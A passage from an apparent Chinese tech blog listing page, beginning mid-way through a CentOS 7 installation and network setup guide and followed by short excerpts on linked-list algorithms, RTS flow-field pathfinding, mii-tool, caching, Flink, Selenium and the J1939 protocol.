点击其中一个，进入下载最新镜像文件下载页面，找到最新ISO文件：CentOS-7-x86_64-DVD-2207-02.iso，即22年7月更新的CentOS 7，一个DVD，一个Everything，一般DVD这个就够用了
镜像下载后，我们这里用vmware虚拟机来安装和测试。
二、安装系统 因为这里是镜像文件，而不是光盘，所以不用检测介质，直接选择“Install CentOS 7”
选择需要的语言，默认是英语，这里选择简体中文
考虑系统安全，这里选择“最小化安装”。最小化安装，服务开启的最少，端口开放的就越少，被攻击的可能性也就越小，当然，后面其它文章会讲Linux系统防火墙。
1）软件选择
2）磁盘分区 这里自动配置分区，如果磁盘大于100G， 建议手动配置分区，因为自动分区会把系统必须空间以外的容量全部分给home分区。
因为这里是实验，不需要做故障分析，所以禁用“KDUMP"
点击开始安装，过程中设置好root密码。
安装重启后，登入系统cat /etc/redhat-release查看版本信息
默认网络没有随机启动，需要编辑vi /etc/sysconfig/network-scripts/ifcfg-ens33配置文件，将ONBOOT设置为yes并保存
vi /etc/sysconfig/network-scripts/ifcfg-ens33 然后敲入命令，重启网络服务
systemctl restart NetworkManager 最后用ping检查网络，截图是正常的，如果网络不通，会有timeout提示。
*如果虚拟机没有开启DHCP服务，则网络不通，需要继续配置网络。
进入到 /etc/sysconfig/network-scripts 目录下，编辑ifcfg-ens33 文件进行配置
将BOOTPROTO设置为static，即静态IP，在文件最后面添加：
IPADDR=192.168.116.200 # ip地址，与VM的DHCP中的ip范围相对应 NETMASK=255.255.255.0 GATEWAY=192.168.116.2 # 填写VM网关 DNS1=114.114.114.114 #南京DNS DNS2=192.168.116.2 保存退出后，再次敲入命令systemctl restart NetworkManager重启网络服务并检查网络。
三、系统更新 通过yum update命令进行更新，安装和指纹校验均可以输入Y确认继续，直至更新完成。
yum update 至此，Linux安装和更新已经完成，下一篇将记录Linux的安全加固过程。
【特别说明】：由于个人知识有限，如有错误之处，还请各位网友、大咖评论区指正~不胜感激！
==============记录我和Linux、信息安全的点点滴滴！==============
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/881f5c42b950d33151920e4f4db9b3dd/" rel="bookmark">
			首场“解数Talk” 直播来了——大模型语料数据联盟开源数据集解读
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、解数 Talk 介绍
为帮助广大开发者更好地了解大模型语料数据联盟发布的AI大模型语料数据，沟通大模型企业在AI视角下的数据需求，不断服务大模型产业生态和落地应用，联盟发起单位上海人工智能实验室联合成员单位共同打造“解数 Talk”系列直播。
12月13日 周三19:00，“解数Talk”首场直播，将解读“蜜巢·花粉1.0”数据集和“国际仲裁法律、规则与实践”数据集。后续更多直播，敬请关注OpenDataLab。
此次讲解的2个数据集，已上架OpenDataLab平台，欢迎大家访问http://opendatalab.org.cn网站查看、下载。
● 首期精彩预告
第一期线上直播活动，特邀联盟成员单位上海蜜度和上海仲裁委员会的专家，为大家深度解读一下已开源发布的两个高质量数据集“蜜巢·花粉1.0”和“国际仲裁法律、规则与实践数据集”。
欢迎大家在12月13日 19:00 观看亿欧网直播
数据集下载链接：
蜜巢·花粉1.0：https://opendatalab.org.cn/OpenDataLab/MiChao
国际仲裁法律、规则与实践数据集：https://opendatalab.org.cn/OpenDataLab/International-Arbitration-Dataset
如有数据合作需求，欢迎私信我们交流
二、联盟介绍
为应对大模型发展对高质量、大规模、安全可信语料数据资源的需求，由上海人工智能实验室联合中央广播电视总台、人民网、国家气象中心、中国科学技术信息研究所、上海报业集团等单位联合发起成立了大模型语料数据联盟。联盟旨在通过链接模型训练、数据供给、学术研究、第三方服务等多方面机构，共同推动高水平语料数据要素建设。
目前，联盟已开展“寻数计划”、联盟开放日等活动，同成员单位一起在大模型语料数据领域深度开展交流合作。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db0a0f56fbcf563dbbec810977b5b20f/" rel="bookmark">
			算法----删除链表的中间节点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目 给你一个链表的头节点 head 。删除 链表的 中间节点 ，并返回修改后的链表的头节点 head 。
长度为 n 链表的中间节点是从头数起第 ⌊n / 2⌋ 个节点（下标从 0 开始），其中 ⌊x⌋ 表示小于或等于 x 的最大整数。
对于 n = 1、2、3、4 和 5 的情况，中间节点的下标分别是 0、1、1、2 和 2 。
示例 1：
输入：head = [1,3,4,7,1,2,6]
输出：[1,3,4,1,2,6]
解释：
上图表示给出的链表。节点的下标分别标注在每个节点的下方。
由于 n = 7 ，值为 7 的节点 3 是中间节点，用红色标注。
返回结果为移除节点后的新链表。
示例 2：
输入：head = [1,2,3,4]
输出：[1,2,4]
解释：
上图表示给出的链表。
对于 n = 4 ，值为 3 的节点 2 是中间节点，用红色标注。
示例 3：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/db0a0f56fbcf563dbbec810977b5b20f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7cd7358feec6bb3e89066486073546fb/" rel="bookmark">
			中洺科技-数据标注创就业浪潮
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		平凡的事不能普通的做那么就有所不同。这也是我们在这波新的AI浪潮中做副业、创业时应该思考的。
正如一些业内从业者所说，数据标注行业本身的利润其实非常有限。如果现在招聘专职数据标注人员的成本太高，只做标注项目的公司就太难立足了，数据标注甲方的质量和效率都在不断提高。
所以在数据标注行业，也有想做项目的人，以创业的形式加入这个AI的数据基础层。但是进入这个行业，找到项目资源，开始运营都很难。唯一容易的就是容易被骗。
其实我们刚进入数据标注行业的时候也是这样。虽然行业现状不同，但遇到的问题是一样的。接单不容易，项目资源对接难，交付更担心不结算的情况。因此，通过不断的努力，我找到了河北中洺科技数据标注项目的服务平台。在合作模式上，不仅提供专业的数据标注服务，还提供相关技术、资源和经验，为数据标注合作伙伴提供数据标注人才管理系统、标注实践系统、课程、等服务支持。一手任务单价也相对较高我一天有3小时的时间可以兼职，不说多但零花钱是满满的差不多时薪20-35之间。 总之，在这个数据驱动的时代，合作已经成为推动产业发展的关键。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae8b3dbb467e6257ead9070f377b12af/" rel="bookmark">
			C#字符串特点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		c#String的不变特性，可读但不可写性 - 麦田HH - 博客园 (cnblogs.com)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d5712374897436894564d4c320919a44/" rel="bookmark">
			RTS核心技术:流场寻路详解(Flow Field Pathfinding)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 RTS里面经常会有很多角色，群体一起寻路到目的地附近，这种寻路是如何实现的，今天给大家详细的讲解基于流场寻路的算法。在本教程中，我将解释向量场寻路及其相对于Dijkstra等传统寻路算法的优势。对Dijkstra算法和势场的基本理解将有助于理解本文，但不是必需的。
对惹，这里有一个游戏开发交流小组，希望大家可以点击进来一起交流一下开发经验呀！
寻路的问题有很多种解决方案，如AStar等, 每种寻路的方案都各有优缺点，大部分的寻路，都是角色要从A点走到B点，然后调用寻路算法找出一条路径出来。通常情况下这样是不会有问题的，但是对于像RTS这种游戏需要做群体寻路，从A点到B点一群角色走过去，如果每个角色都单独寻路，这样性能开销会比较大，所以今天我们为了解决这个问题，介绍基于流场向量的寻路。它的原理是把目标点的流场计算出来，所有移动的目标共用这个流量场。接下来本文讲详细的介绍流场寻路的核心技术与步骤。(本文是将地图基于网格来讲解的，你也可以用到其它的地方，不限于网格)。
基于流场寻路的算法的主要步骤
基于流场寻路的算法主要包含以下三个步骤:
(1) 遍历游戏地图种的每个块，计算出来当前块到目标的距离,称为"Heatmap"热度图;
(2) 为每个地图块，根据Heatmap生成一个向量场,指定了每个块到目标的方向 称为"Vector Field";
(3) 到目的地的每个角色，都共用这个向量场来移动导航到目标点;
生成Heatmap
Heatmap 是指从目标点到地图上每个图块的路径距离。路径距离不同于欧几里德距离，它是通过可穿越地形的最短的两点之间距离来计算。如下图，你可以看到从目标点（用红色标记）到地图任意的点（用粉色标记）的路径距离和线性距离之间的差异。不可行走的块以绿色绘制。如图，路径距离（以黄色显示）为9，而线性距离（以浅蓝色显示）约为4.12。每个图块左上角的数字显示由Heatmap生成算法计算出的到目标的路径距离。注意两点之间可能有一个以上的路径距离, 我们只算最短的那个距离。经过算法第一步，我们把地图上的每个块到目的地的最短距离都计算了出来，生成了Heatmap。
Heatmap生成算法是一种 wavefront 算法。它从值为0的目标开始，然后向外流动以填充整个可遍历区域。 wavefront 算法有两个步骤：
(1)从目标开始，并用0的路径距离标记它。
(2)获取每个标记的图块的未标记邻居，并用前一个图块的路径距离+1标记它们。
(3) 标记完所有地图的块后，算法结束。
注: wavefront 算法是在网格上执行广度优先搜索，并存储沿途到达每个块所需的步骤。这种算法有时也称为brushfire算法。
Vector Field 生成
现在已经计算了从每个块到目标的路径距离，我们可以很容易地确定接近目标需要采取的路径。通常计算一次Vector Filed，然后让所有要寻路的对象在运行时引用该Vector Filed。
Vector Field 简单地存储了一个向量，该向量指向每个地图块走向目的地的方向（朝向目标）。这里是向量场的可视化，向量从图块的中心沿着最短路径指向目标,形成了一个流场。（红色为原点，白色的线为方向，大体趋势都指向目标点）。
这个向量场里面的每个向量，是通过Heatmap计算出来的，具体的计算Vector向量方式如下:
Vector.x = left_tile.distance - right_tile.distance, 向量x为左边的块-右边的块;
Vector.y = up_tile.distance - down_tile.distance,向量y为上边的块-下面的块;
每个块的distance,就是上面Heatmap种计算出来的数值。
如果当前块的（左/右/上/下）不可行走(障碍物等)，则使用与当前块的距离来代替缺少的值。一旦粗略计算了路径向量，就对其进行归一化，以避免以后出现不一致。
角色移动导航
现在矢量场已经计算出来了，计算探路者的运动就很容易了。假设vector_field（x，y）返回我们之前在tile（x，y）处计算的向量，并且移动速度大小一直，则计算tile（x，y）处移动速度的伪代码如下所示：
velocity_vector = vector_field(x, y) * desired_velocity
当我们导航的时候，只要沿着向量方向移动就可以了,很容易就实现了流场移动, 同时多个角色目标寻路的时候，只要计算一次。
如上图，紫色的点，水平不可以移动，上下两个块的距离都是一样的，这样就导致了不唯一性，一半这种情况，我们会随机选着一个方向，这样导致的结果可能就是我们选择的路径不一定是最短的，所以流场寻路又是基于局部最优解的。要解决这样的问题，还有一个好的方法，就是把块分小，降低这样的几率。
当然把块分小，计算量也会增大。
好今天的流场寻路的内容就分享到这里了
博毅创为游戏学院​bycwedu.vipwan.cn/promotion_channels/2146264125​编辑
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0291bd99fe735d0320e2bfc4841a79df/" rel="bookmark">
			miitool 和ethtool工具介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章来源：https://www.cnblogs.com/fengyv/p/2423895.html
1.1 mii-tool 介绍；
mii-tool - view, manipulate media-independent interface status （mii-tool 是查看，管理介质的网络接口的状态）
有时网卡需要配置协商方式 ，比如10/100/1000M的网卡半双工、全双工、自动协商的配置 。但大多数的网络设备是不用我们来修改协商，因为大多数网络设置接入的时候，都采用自动协商来解决相互通信的问题。不过自动协商也不是万能的，有时也会出现错误，比如丢包率比较高，这时就要我们来指定网卡的协商方式 。
mii-tool 就是能指定网卡的协商方式。下面我们说一说mii-tool的用法；
1.2 mii-tool 的用法；
mii-tool 在更改网络设备通信协商方式的方法比较简单，用 -v 参数来查看网络接口的状态；看下面的例子；
mii-tool 更改网络接口协商的方法；
[root@localhost ~]# mii-tool --help
usage: mii-tool [-VvRrwl] [-A media,... | -F media] [interface ...]
-V, --version display version information
-v, --verbose more verbose output 注：显示网络接口的信息；
-R, --reset reset MII to poweron state 注：重设MII到开启状态；
-r, --restart restart autonegotiation 注：重启自动协商模式；
-w, --watch monitor for link status changes 注：查看网络接口连接的状态变化；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0291bd99fe735d0320e2bfc4841a79df/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/652be055093e3795522d4d4308226aa7/" rel="bookmark">
			哪些数据适合放入缓存？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		缓存是一种常用的技术，用于临时存储数据以提高数据检索的速度。选择适合放入缓存的数据时，关键在于识别哪些数据的检索成本较高，且相对静态不经常变化。以下是一些适合放入缓存的数据类型，以及相应的例子：
1. 静态资源 例子：网站的CSS文件、JavaScript脚本、图片和字体文件。原因：这些资源在网站的生命周期内很少更改，而且它们被所有用户共享。通过缓存静态资源，可以减少网络延迟和服务器负载，加快页面加载速度。 2. 计算成本高的数据 例子：电商网站上的推荐产品列表，这些列表可能基于复杂的机器学习算法生成。原因：计算这些推荐可能非常耗时。一旦计算出来，可以将它们缓存一段时间，对于新的用户请求直接从缓存中提取。 3. 频繁读取的数据 例子：用户的个人资料信息，在社交网络站点上经常被访问。原因：对于频繁访问的数据，直接从数据库读取会增加延迟和数据库的负担。缓存这些数据可以提高读取速度和减少数据库的压力。 4. 不经常更新的数据 例子：新闻网站上的新闻文章。原因：一旦发布，这些文章很少更改。将它们缓存可以提高访问速度，并减少每次访问时对原始数据源的负载。 5. 外部API调用的结果 例子：天气应用程序调用第三方API获取的天气数据。原因：API调用可能会遇到网络延迟，并且可能有成本限制（如API调用次数的限制）。缓存API的响应结果可以减少对第三方服务的依赖，并提高响应速度。 6. 用户会话数据 例子：用户登录状态和偏好设置。原因：这些信息通常在用户会话期间保持不变。将其缓存可以提高数据检索速度，并减轻后端系统的负载。 注意事项 尽管缓存可以提高性能，但也需要考虑缓存管理的问题，例如：
缓存失效策略：决定何时更新或删除缓存中的数据。数据一致性：确保缓存中的数据与数据库中的数据保持一致。安全性：敏感数据（如个人身份信息）需要特别处理，以避免安全风险。 合理的缓存策略可以显著提高应用性能，提升用户体验，并减轻后端服务的负担。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f1747266870bd34e21bc2eaaf3f71236/" rel="bookmark">
			C&#43;&#43;力扣题目707--设计链表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		你可以选择使用单链表或者双链表，设计并实现自己的链表。
单链表中的节点应该具备两个属性：val 和 next 。val 是当前节点的值，next 是指向下一个节点的指针/引用。
如果是双向链表，则还需要属性 prev 以指示链表中的上一个节点。假设链表中的所有节点下标从 0 开始。
实现 MyLinkedList 类：
MyLinkedList() 初始化 MyLinkedList 对象。int get(int index) 获取链表中下标为 index 的节点的值。如果下标无效，则返回 -1 。void addAtHead(int val) 将一个值为 val 的节点插入到链表中第一个元素之前。在插入完成后，新节点会成为链表的第一个节点。void addAtTail(int val) 将一个值为 val 的节点追加到链表中作为链表的最后一个元素。void addAtIndex(int index, int val) 将一个值为 val 的节点插入到链表中下标为 index 的节点之前。如果 index 等于链表的长度，那么该节点会被追加到链表的末尾。如果 index 比长度更大，该节点将 不会插入 到链表中。void deleteAtIndex(int index) 如果下标有效，则删除链表中下标为 index 的节点。 思路：该题为链表的常见操作的设计，很考验基础，链表操作有两种方式，加虚拟头结点和不加虚拟头结点，本人使用的是加虚拟头结点的方式。代码书写时要注意表达句里的地址是否为空。
代码如下：
class MyLinkedList { public: struct linknode//自己定义一个单链表 { int val; linknode* next; linknode(int a) :val(a),next(nullptr){ } }; linknode* virhead;//链表指针域 int size;//链表长度 MyLinkedList() { virhead = new linknode(0);//初始化虚拟结点 size = 0; } int get(int index) { if (index&lt;0 || index&gt;(size-1)) { return -1; }//链表下标从0开始 linknode* p = virhead; while (index &gt;= 0) { p = p-&gt;next; index--; } return p-&gt;val; } void addAtHead(int val) { linknode* p = new linknode(val);//创建一个新结点,直接赋值 p-&gt;next = virhead-&gt;next;//让该空结点指向虚拟结点的下一个结点，即原链表的头结点 virhead-&gt;next = p;//将空结点的地址传递给虚拟结点 size++;//不要忘了链表长度，长度加1 } void addAtTail(int val) { linknode* q = virhead; linknode* p = new linknode(val);//创建一个新结点,直接赋值 while (q-&gt;next !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f1747266870bd34e21bc2eaaf3f71236/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c31e8cfc36af93fd20dfc506b9d06cbd/" rel="bookmark">
			关于如何在vuepress编辑文档
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		！！首先鸣谢鱼皮大大开源的模版框架
首先要在官网下载node和npm，版本随意，下载好后，可以打开cmd命令行来查看是否成功，输入node -v，然后回车，再输入npm -v，然后回车，出现数字版本则代表成功 打开文件目录，执行npm install命令（注意以管理员身份运行），来下载一些资源，慢慢等候，下载完成后就可以进行下一步
在编辑器中打开文件，
示例：如果要在项目实战栏目中写论文，则右击鼠标，创建一个file，输入你的文章名字，注意后缀名字需要加.md
创建好后，就可以在里面编写你的文章
可以参照其他文章的写法来进行编写，#是一级标题，##是二级，依次类推， &gt; 会给你的文字加上阴影背景，更多样式参考其他文章。
编写完成后在本目录的README.md中用总括号添加，类似于此
最后一步，在sidebars文件中，找到你栏目对应的名字，看title对应，然后把文章名字输入进去，记得后缀.md,文章便书写完成
编写完成后，点击主目package.json文件，点击第一个绿色小箭头，运行项目 ，点击控制台网址查看结果
效果图展示
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f36ff56f4b2d47d61945490edf16f62f/" rel="bookmark">
			基于SSM的作业管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		收藏关注不迷路
文章目录 一、项目介绍二、开发环境三、功能介绍四、核心代码五、效果图六、文章目录 一、项目介绍 本设计主要实现集人性化、高效率、便捷等优点于一身的作业管理系统，完成校园资讯、资讯分类、线上题库、系统用户、授课班级、班级课程、主观题库、主观答题、作业信息、学生作业、批阅信息、成绩信息、班级名称等功能模块。系统通过浏览器与服务器进行通信，实现数据的交互与变更。本系统通过科学的管理方式、便捷的服务提高了工作效率，减少了数据存储上的错误和遗漏。作业管理系统使用Java语言，采用基于 MVC模式的SSM技术进行开发，使用 Eclipse编译器编写，数据方面主要采用的是微软的MySQL关系型数据库来作为数据存储媒介，配合前台HTML+CSS 技术完成系统的开发。
关键词：线上题库；Java语言；MySQL数据库；SSM框架
二、开发环境 开发语言：Java
框架：ssm
JDK版本：JDK1.8
服务器：tomcat7
数据库：mysql
数据库工具：Navicat11
开发软件：eclipse/myeclipse/idea
Maven包：Maven
————————————————
三、功能介绍 在系统开发设计前，应该对功能做初步设想，清楚这个管理系统有什么板块，每个板块有什么功能，整体的设计是否满足使用者的需求，接着对所开发的系统功能进行的详细分析总结，从而设计出完整的系统并将其实现。用户和开发人员的交流分析，使其达到最佳理解程度，使系统功能达到最佳。
学生用例图如下所示。
图3-1 学生用例图
教师用例图如下所示。
图3-2 教师用例图
管理员用例图如下所示。
图3-3 管理员用例图
作业管理系统在对需求做解析后，整个系统主要分为三个部分：管理员和学生、教师，每个模块下的分支功能不一样。对功能做出如下说明：
学生模块：
账号登录认证。
管理个人资料信息，修改可修改的信息项。
浏览网站公告信息。
浏览校园资讯数据信息。
线上题库：浏览线上题库信息，可选择某一个题库进行答题测试。
主观题库：浏览主观题库信息，可选择某一题库进行答题。
作业布置查询，同时查看历史已布置的作业记录。
我的收藏，同时查看历史已收藏的记录。
教师模块：
账号登录认证。
管理个人资料信息，修改可修改的信息项。
添加线上题库信息。
管理授课班级以及班级课程信息。
维护、添加主观题库题目数据。
批阅学生的主观答题内容。
发布作业信息，同时查看历史已提交的作业布置记录。
作业批阅，教师对学生上交的作业进行批阅，同时查看历史已批阅的记录。
成绩信息，教师统计本班级的学生成绩信息。
管理员模块：
维护教师用户，审核教师的账号，可以冻结教师的登录权限，或者删除教师账号。
维护学生用户，审核学生用户的账号，可以冻结学生用户的登录权限，或者删除学生用户账号。
发布网站公告信息，维护公告信息数据。
发布校园校园资讯，维护校园校园资讯数据。
管理线上题库信息。
发布授课班级，并可以销毁某个授课班级，更新授课班级数据，模糊搜索授课班级数据等。
发布班级课程，并可以销毁某个班级课程，更新班级课程数据，模糊搜索班级课程数据等。
管理作业批阅信息数据。
维护成绩信息数据。
查看教师发布学生作业数据，管理员有权利维护它。
管理班级名称信息。
四、核心代码 部分代码：
package com.fc.v2.controller; import com.fc.v2.common.base.BaseController; import io.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f36ff56f4b2d47d61945490edf16f62f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b99c7ed54cfd99007a73318c03e60e1/" rel="bookmark">
			【Flink名称解释一】什么是cataLog
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Catalog 提供了元数据信息，例如数据库、表、分区、视图以及数据库或其他外部系统中存储的函数和信息。
数据处理最关键的方面之一是管理元数据。 元数据可以是临时的，例如临时表、或者通过 TableEnvironment 注册的 UDF。 元数据也可以是持久化的，例如 Hive Metastore 中的元数据。Catalog 提供了一个统一的API，用于管理元数据，并使其可以从 Table API 和 SQL 查询语句中来访问。
CataLog类型：
GenericInMemoryCatalog，GenericInMemoryCatalog 是基于内存实现的 Catalog，所有元数据只在 session 的生命周期内可用。
JdbcCatalog 使得用户可以将 Flink 通过 JDBC 协议连接到关系数据库。PostgresCatalog 是当前实现的唯一一种 JDBC Catalog。 参考 JdbcCatalog 文档 获取关于配置 JDBC catalog 的详细信息。
HiveCatalog 有两个用途：作为原生 Flink 元数据的持久化存储，以及作为读写现有 Hive 元数据的接口。 Flink 的 Hive 文档 提供了有关设置 HiveCatalog 以及访问现有 Hive 元数据的详细信息。
注意：Hive Metastore 以小写形式存储所有元数据对象名称。而 GenericInMemoryCatalog 区分大小写。
-----之后补充 如何创建 Flink 表并将其注册到 Catalog 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af781a104f3781e2b97ca68754563005/" rel="bookmark">
			三天精通Selenium Web 自动化 - 如何找到元素
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 什么是元素？ 元素：HTML 元素
2. 定位方式解析 Selenium WebDriver 提供一个先进的技术来定位 web 页面元素。Selenium 功能丰富的API 提供了多个定位策略如:Name、ID、CSS 选择器、XPath 等等，如下图所示：
一般会用ID来定位，因为它是唯一的，xpath也比较通用，火狐浏览器插件：firepath和firebug是快速给出元素的xpath。
另外JQuery也是很好的定位方法
2.1 通过jQuery来定位元素 jQuery提供了find方法，来快速查找页面元素，但此方法也仅限使用了jquery库的页面。
2.1.1 如何判别页面使用了jQuery 打开火狐浏览器，输入谷歌地址：https://www.google.com.hk/，按F12调出控制台，接着在最下面的箭头处输入：“jQuery”，然后回车：
若控制台会返回：“function(e, t)” 这就表明此页面适用了jQuery库。若控制台会返回错误提示：ReferenceError:jQuery is not defined 这就证明当前的页面没有适用到jQuery库 代码如下：
View Code
自动化测试相关教程推荐： 2023最新自动化测试自学教程新手小白26天入门最详细教程,目前已有300多人通过学习这套教程入职大厂！！_哔哩哔哩_bilibili 2023最新合集Python自动化测试开发框架【全栈/实战/教程】合集精华，学完年薪40W+_哔哩哔哩_bilibili 测试开发相关教程推荐 2023全网最牛，字节测试开发大佬现场教学，从零开始教你成为年薪百万的测试开发工程师_哔哩哔哩_bilibili postman/jmeter/fiddler测试工具类教程推荐 讲的最详细JMeter接口测试/接口自动化测试项目实战合集教程，学jmeter接口测试一套教程就够了！！_哔哩哔哩_bilibili 2023自学fiddler抓包，请一定要看完【如何1天学会fiddler抓包】的全网最详细视频教程！！_哔哩哔哩_bilibili 2023全网封神，B站讲的最详细的Postman接口测试实战教学，小白都能学会_哔哩哔哩_bilibili 总结： 光学理论是没用的，要学会跟着一起敲，要动手实操，才能将自己的所学运用到实际当中去，这时候可以搞点实战案例来学习。 如果对你有帮助的话，点个赞收个藏，给作者一个鼓励。也方便你下次能够快速查找。
如有不懂还要咨询下方小卡片，博主也希望和志同道合的测试人员一起学习进步
在适当的年龄，选择适当的岗位，尽量去发挥好自己的优势。
我的自动化测试开发之路，一路走来都离不每个阶段的计划，因为自己喜欢规划和总结，
测试开发视频教程、学习笔记领取传送门！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9132bb9e436ae53d2107a7e1798cd75f/" rel="bookmark">
			三天精通Selenium Web 自动化 - Selenium(Java)环境搭建 （new）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0 背景 开发工具idea代码管理mavenjdk1.8webdriver chrome 1 chromedriver &amp; chrome chromedriver和chrome要对应上：
chomedriver下载地址：淘宝镜像 这里用的是 chromedriver88-0-4324-96.zipchrome下载地址：如何降级和安装旧版本的Chrome？ 这里用的是 ChromeStandaloneSetup_88.0.4324.150.exe 2 jar包 &amp; 代码 pom.xml
View Code
code
import org.openqa.selenium.*; import org.openqa.selenium.chrome.ChromeDriver; import java.time.Duration; import java.util.Iterator; import java.util.Set; public class SearchBaidu { public static void main(String[] args) throws InterruptedException { String chromedriver_win="D:\\Code\\seleniumDemo\\src\\main\\resources\\chromedriver.exe"; System.setProperty("webdriver.chrome.driver", chromedriver_win); WebDriver webDriver= new ChromeDriver(); MutiWindowTest(webDriver); Thread.sleep(2000); webDriver.get("https://www.baidu.com"); webDriver.manage().timeouts().implicitlyWait(Duration.ofSeconds(10)); Dimension d =new Dimension(800,600); webDriver.manage().window().setSize(d); Thread.sleep(2000); Point p=new Point(500,300); webDriver.manage().window().setPosition(p); Thread.sleep(2000); webDriver.manage().window().fullscreen(); Thread.sleep(3000); webDriver.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9132bb9e436ae53d2107a7e1798cd75f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53cb7ae9950c1e25d63eef0d6821fcf0/" rel="bookmark">
			J1939协议解读
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、报文格式 1.1协议数据单元(Protocol Data Unit, PDU) J1939报文使用的基于CAN2.0B的拓展帧格式定义了一个完整的标准化通讯策略，通过PDU定义了一个框架，用来组织数据帧中J1939协议相关的信息。PDU由数据帧中的ID和数据场组成，数据帧和PDU的对应关系如下图所示。
P(Priority)，优先级字段，用于在仲裁过程中控制报文优先级。EDP(Extended Data Page)，为扩展数据页位，在J1939中固定取值为0。P(Data Page)，数据页位，可用来扩展参数组的数量。PF(PDU Format)，为PDU格式字段，通过不同的取值来确定参数组编号(Parameter Group Number, PGN)是按照PDU1格式还是PDU2格式。PS(PDU Specific)，特定协议数据单元字段，当PF的值为0-239时PS表示目标地址（PDU1格式），当PF的值为240-255时PS字段表示组扩展（PDU2格式），且报文只能广播。SA(Source Address)，源地址字段，整个网络中SA的值必须是唯一的。Data Field，数据场，对于Classic CAN来说是8个字节，而CANFD则最多有64个字节数据。如果需要传输更多的数据，则需要借助J1939的传输协议。 图2. CAN2.0B帧格式与J1939PDU的对应关系
1.2参数组编号(PGN) 参数组是应用层中定义的与某个ECU相关的具有相同控制功能的若干个参数的组合，而PGN是用于唯一标识参数组的号码，在应用层中定义。PGN由三个字节组成，从最高位开始的前6个比特默认值为0，然后是EDP位和DP位，接下来两个字节分别是PF和PS。
图3. PDU与PGN的对应关系
1.3实例分析 实例分析1
typedef struct{
uint8 pf; //PF:为PDU格式字段，通过不同的取值来确定
//参数组编号(Parameter Group Number, PGN)是按照PDU1格式还是PDU2格式。
uint8 ps; //PS:特定协议数据单元字段，当PF的值为0-239时PS表示目标地址（PDU1格式），
//当PF的值为240-255时PS字段表示组扩展（PDU2格式），且报文只能广播。
uint8 prior; //优先级
uint8 framtype; //数据帧格式：标准帧还是扩展帧
uint8 transtype; //传递格式：规定传输方向
uint16 rate; //通信速率
}CCS_SLAVE_PROTOCAL_CONST_PARA;
CCS_SLAVE_PROTOCAL_CONST_PARA const CCS_SLAVE_TX_PARA[CCS_SLAVE_TX_TOTAL]={
{0xE1,0xE0,6, CAN_FRAMTYPE_EXT,TT_ASYNC,150}, //WL
{0xE2,0xE0,6, CAN_FRAMTYPE_EXT,TT_ASYNC,160}, //WL
{0xE3,0xE0,6, CAN_FRAMTYPE_EXT,TT_ASYNC,170}, //WL
{0xE4,0xE0,6, CAN_FRAMTYPE_EXT,TT_ASYNC,180}, //WL {0xE5,0xE0,6, CAN_FRAMTYPE_EXT,TT_ASYNC,190}, //WL
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53cb7ae9950c1e25d63eef0d6821fcf0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd526570f46aefd45521d4c814b9a275/" rel="bookmark">
			TransactionScope的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
